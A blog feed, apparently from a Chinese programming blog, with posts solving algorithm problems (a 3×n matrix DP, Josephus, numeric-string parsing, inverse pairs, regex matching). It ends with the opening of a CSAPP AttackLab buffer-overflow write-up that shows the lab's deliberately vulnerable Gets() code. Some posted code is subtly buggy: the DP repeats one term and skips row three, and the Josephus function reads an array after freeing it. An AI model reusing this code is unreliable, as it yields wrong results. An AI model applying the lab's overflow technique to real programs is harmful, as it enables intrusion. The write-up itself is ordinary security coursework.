        <content type="html"><![CDATA[<h1 id="阿里-3月25日-笔试第一题"><a href="#阿里-3月25日-笔试第一题" class="headerlink" title="阿里 3月25日 笔试第一题"></a>阿里 3月25日 笔试第一题</h1><p>题目描述：</p><blockquote><p>给定一个 3 * n 的矩阵，从每列选取一个元素组成一个新的长度为 n 的数组。求此数组前后元素之间差值的绝对值之和最小。</p></blockquote><p>示例：</p><blockquote><p>5 9 5 4 4<br>4 7 4 10 3<br>2 10 9 2 3<br>结果为 5。选取的元素为 5 7 5 4 4</p></blockquote><p>这题一开始我用的贪心，浪费了十多二十分钟才发现不能直接贪。。<br>然后二话不说就开始回溯，然后我本来写回溯就要很久。。然后又出了各种 bug 调试了半天最后没时间了。。。回溯写出来应该是对的，但是跑到 30% 的时候就爆栈了。。然后也没时间再慢慢思考了。。。所以说做 OJ 还是不要轻易用回溯。</p><p>所以这道题应该用动规。。</p><pre class=" language-python"><code class="language-python">n <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> list<span class="token punctuation">(</span>map<span class="token punctuation">(</span>int<span class="token punctuation">,</span> input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    b<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> min<span class="token punctuation">(</span>abs<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> abs<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                         abs<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">-</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>min<span class="token punctuation">(</span>dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>下来之后回想还是挺简单的。。但是我做算法题本来就比较慢，思考要思考半天。。感觉再怎么刷题也没办法提升我的速度。。然后还有时间限制，就更慌了。。。</p><p>不该啊不该。。什么时候才能身经百战游刃有余。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 算法题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
            <tag> 阿里面试 </tag>
            
            <tag> Python </tag>
            
            <tag> 动态规划 </tag>
            
            <tag> 矩阵 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>约瑟夫环问题</title>
      <link href="/josephus/"/>
      <url>/josephus/</url>
      
        <content type="html"><![CDATA[<h1 id="约瑟夫环问题"><a href="#约瑟夫环问题" class="headerlink" title="约瑟夫环问题"></a>约瑟夫环问题</h1><blockquote><p>n 个人（编号 0 ~ n-1）围成环，从 0 开始报数（最开始从编号 0 开始），报到（m-1）的退出，剩下的人继续从 0 开始报数（从退出的人下一个人开始）。求最后留下来的人的编号。</p></blockquote><p>解法：</p><ul><li>用数组或者链表模拟整个过程。</li><li>数学推导。</li></ul><p>这里就只写数学推导的方法了。</p><p>第一次：从 0 开始报数，(m-1) mod n 出圈。</p><p>第二次：从 m mod n 开始报数，假设 k = m mod n，这里形成了新的约瑟夫环 k, k+1, …, n - 1, 0, 1, 2, …, k-2。将编号整体减 k 模 n - 1，得到 0, 1, 2, … , n-2，这又变成了 n-1 个人的约瑟夫环问题了。</p><p>由此类推，可以得知约瑟夫环问题存在递推关系。</p><p>设 i 个人报 m 个数情况下的胜者编号为 f[i]，可以轻易地得出以下递推关系：</p><ul><li>f[1] = 0</li><li>f[i] = (f[i-1] + m) mod i (i &gt; 1)</li></ul><p>于是便可以容易地编写出代码了。</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">Josephus</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>m <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span><span class="token operator">*</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        f<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>             f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>f<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> m<span class="token punctuation">)</span> <span class="token operator">%</span> i<span class="token punctuation">;</span>        <span class="token keyword">delete</span><span class="token punctuation">[</span><span class="token punctuation">]</span> f<span class="token punctuation">;</span>        <span class="token keyword">return</span> f<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
            <tag> 动态规划 </tag>
            
            <tag> C++ </tag>
            
            <tag> 约瑟夫环 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>是否是数字</title>
      <link href="/if-str-is-number/"/>
      <url>/if-str-is-number/</url>
      
        <content type="html"><![CDATA[<h1 id="是否是数字"><a href="#是否是数字" class="headerlink" title="是否是数字"></a>是否是数字</h1><p>一道很恶心的题。如果真的是笔试时候不知道自己哪种例子没过就凉凉。</p><blockquote><p>请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”,”5e2”,”-123”,”3.1416”和”-1E-16”都表示数值。 但是”12e”,”1a3.14”,”1.2.3”,”+-5”和”12e+4.3”都不是。</p></blockquote><p>遇到的坑：</p><ul><li><strong>小数点前可以什么都没有</strong>。+.123 这种也算做数字，也可以添加正负号。</li><li><strong>e/E 后面必须有数字</strong></li></ul><p>Python 没有 <code>switch</code> 那就暴力 <code>if-else</code> 了。（其实我想用 C++ 的，但用都用 Python 了就继续吧。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">isNumeric</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># write code here</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">or</span> s <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">or</span> s <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">or</span> s <span class="token operator">==</span> <span class="token string">'e'</span> <span class="token operator">or</span> s <span class="token operator">==</span> <span class="token string">'E'</span> <span class="token operator">or</span> s <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    numbers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span>    signs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">]</span>    e <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> numbers <span class="token operator">+</span> signs<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">in</span> signs<span class="token punctuation">:</span>        state <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        state <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> numbers <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> numbers<span class="token punctuation">:</span>                    state <span class="token operator">=</span> <span class="token number">1</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    state <span class="token operator">=</span> <span class="token number">2</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> state <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> numbers <span class="token operator">+</span> e <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                    state <span class="token operator">=</span> <span class="token number">2</span>                <span class="token keyword">elif</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> e<span class="token punctuation">:</span>                    <span class="token keyword">if</span> i <span class="token operator">==</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>                        <span class="token keyword">return</span> <span class="token boolean">False</span>                    state <span class="token operator">=</span> <span class="token number">3</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> state <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> numbers<span class="token punctuation">:</span>                state <span class="token operator">=</span> <span class="token number">5</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> state <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> signs <span class="token operator">+</span> numbers<span class="token punctuation">:</span>                state <span class="token operator">=</span> <span class="token number">4</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> state <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">not</span> <span class="token keyword">in</span> numbers<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">elif</span> state <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> numbers <span class="token operator">+</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> e<span class="token punctuation">:</span>                    state <span class="token operator">=</span> <span class="token number">3</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
            <tag> Python </tag>
            
            <tag> 状态机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数组中的逆序对</title>
      <link href="/inverse-pairs/"/>
      <url>/inverse-pairs/</url>
      
        <content type="html"><![CDATA[<h1 id="数组中的逆序对"><a href="#数组中的逆序对" class="headerlink" title="数组中的逆序对"></a>数组中的逆序对</h1><p>题目描述：</p><blockquote><p>在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组,求出这个数组中的逆序对的总数P。并将P对1000000007取模的结果输出。 即输出P%1000000007。</p></blockquote><p>输入描述：</p><blockquote><p>题目保证输入的数组中没有的相同的数字。<br>数据范围：<br>&nbsp;&nbsp;&nbsp;&nbsp;对于%50的数据,size&lt;=10^4<br>&nbsp;&nbsp;&nbsp;&nbsp;对于%75的数据,size&lt;=10^5<br>&nbsp;&nbsp;&nbsp;&nbsp;对于%100的数据,size&lt;=2*10^5        </p></blockquote><p>示例：</p><blockquote><p>输入：    </p><blockquote><p>1,2,3,4,5,6,7,0    </p></blockquote></blockquote><blockquote><p>输出：</p><blockquote><p>7</p></blockquote></blockquote><p>思路：分治法，类似归并排序的做法。分别计算每小组的逆序对，然后再将其归并排序得到一个大组，然后就可以算出更大组之间的逆序对了。最后得到整个数组的逆序对个数。</p><p>代码实现：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">InversePairs</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># write code here</span>    <span class="token keyword">def</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> left <span class="token operator">==</span> right<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token number">0</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>left<span class="token punctuation">,</span> right<span class="token punctuation">)</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        left_count <span class="token operator">=</span> mergeSort<span class="token punctuation">(</span>data<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>        right_count <span class="token operator">=</span> mergeSort<span class="token punctuation">(</span>data<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span>        two_side_count <span class="token operator">=</span> merge<span class="token punctuation">(</span>data<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> right<span class="token punctuation">)</span>        <span class="token keyword">return</span> left_count <span class="token operator">+</span> two_side_count <span class="token operator">+</span> right_count    <span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">:</span>        i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> count <span class="token operator">=</span> left<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>        temp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> mid <span class="token operator">and</span> j <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            <span class="token keyword">if</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                i <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                j <span class="token operator">+=</span> <span class="token number">1</span>                count <span class="token operator">+=</span> mid <span class="token operator">-</span> i <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> mid<span class="token punctuation">:</span>            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            i <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">while</span> j <span class="token operator">&lt;=</span> right<span class="token punctuation">:</span>            temp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            j <span class="token operator">+=</span> <span class="token number">1</span>        data<span class="token punctuation">[</span>left<span class="token punctuation">:</span> right <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp        <span class="token keyword">del</span> temp        <span class="token keyword">return</span> count    <span class="token keyword">if</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>         <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">return</span> mergeSort<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">1000000007</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
            <tag> Python </tag>
            
            <tag> 分治法 </tag>
            
            <tag> 归并排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则匹配</title>
      <link href="/regular-match/"/>
      <url>/regular-match/</url>
      
        <content type="html"><![CDATA[<h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><p>这题每次做的时候都想半天，记录一下。</p><p>可以使用递归或者动规的方法。</p><blockquote><p>请实现一个函数用来匹配包括’.’和’*‘的正则表达式。模式中的字符’.’表示任意一个字符，而’*‘表示它前面的字符可以出现任意次（包含0次）。 在本题中，匹配是指字符串的所有字符匹配整个模式。例如，字符串”aaa”与模式”a.a”和”ab*ac*a”匹配，但是与”aa.a”和”ab*a”均不匹配。</p></blockquote><p><strong>本算法的正则匹配是贪婪匹配</strong></p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">match</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> pattern<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token string">'\0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>pattern <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pattern <span class="token operator">==</span> <span class="token string">'\0'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>pattern <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token operator">*</span>pattern <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">'\0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>pattern <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">match</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pattern <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// * 匹配 0 个或多个</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> <span class="token operator">*</span>pattern <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">!=</span> <span class="token string">'\0'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>pattern <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token function">match</span><span class="token punctuation">(</span>str <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> pattern<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">match</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pattern <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token keyword">return</span> <span class="token function">match</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pattern <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法题 </tag>
            
            <tag> C++ </tag>
            
            <tag> 分治法 </tag>
            
            <tag> 正则匹配 </tag>
            
            <tag> 递归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AttackLab</title>
      <link href="/attacklab/"/>
      <url>/attacklab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><ol><li>macOS Mojave 10.14.1</li><li>iTerm2 终端</li></ol><h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>详见 <a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf" target="_blank" rel="noopener">http://csapp.cs.cmu.edu/3e/attacklab.pdf</a></p><a id="more"></a><h1 id="开始吧"><a href="#开始吧" class="headerlink" title="开始吧"></a>开始吧</h1><p>准备工作：</p><ul><li>登陆学校服务器</li></ul><p><code>ssh xxxxxxxxxx@10.120.11.13</code></p><ul><li>解压target</li></ul><p><code>tar -xvf target99.tar</code></p><ul><li>将实验所需要的两个程序<code>ctarget</code>和<code>rtarget</code>反汇编</li></ul><p><code>objdump -d ctarget &gt; dis</code><br><code>objdump -d rtarget &gt; dis2</code></p><p>正式开始：</p><h2 id="Part-I-Code-Injection-Attacks"><a href="#Part-I-Code-Injection-Attacks" class="headerlink" title="Part I: Code Injection Attacks"></a>Part I: Code Injection Attacks</h2><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p>根据实验内容pdf文档可以知道，这项内容是让我通过一些操作触发<code>touch1</code>函数。文档中提供了<code>getbuf</code>函数、<code>test</code>函数和<code>touch1</code>函数的C语言代码：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">Gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">touch1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    vlevel <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* Part of validation protocol */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch1!: You called touch1()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 